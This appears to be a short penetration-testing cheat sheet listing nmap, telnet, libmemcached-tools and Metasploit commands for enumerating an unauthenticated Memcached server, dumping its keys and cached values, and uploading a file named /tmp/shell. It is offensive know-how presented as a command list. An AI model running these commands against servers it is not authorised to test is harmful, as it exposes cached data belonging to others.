- - -


- - - 

## Enumeration : 

#### With Nmap : 

```sh
nmap -p11211 --script=memcached-info 192.168.1.32
```


#### With Telnet : 

```sh
telnet 192.168.1.32 11211
version
stats
stats slabs
stats items
stats cachedump 1 0
get first
get second 
get third
```

#### With libmemcached-tools : 

```sh
apt install libmemcached-tools
```

<u>Enumerate Stats : </u>
```sh
memcstat --servers=192.168.1.33
```

<u>Enumerate Keys</u> : 
```sh
memcdump --servers=192.168.1.33
```

<u>Dump valuse stored in keys</u> : 
```sh
memccat --servers=192.168.1.33 fifth fourth third second first
```

- - -

###### Can we Upload Files ??

```sh
memccp --servers=192.168.1.33 /tmp/shell
```

**Cat the uploaded file** : 
```sh
memcat --servers=192.168.1.33 file
```

- - -

#### With MetaSploit : 

```sh
use auxiliary/gather/memcached_extractor
```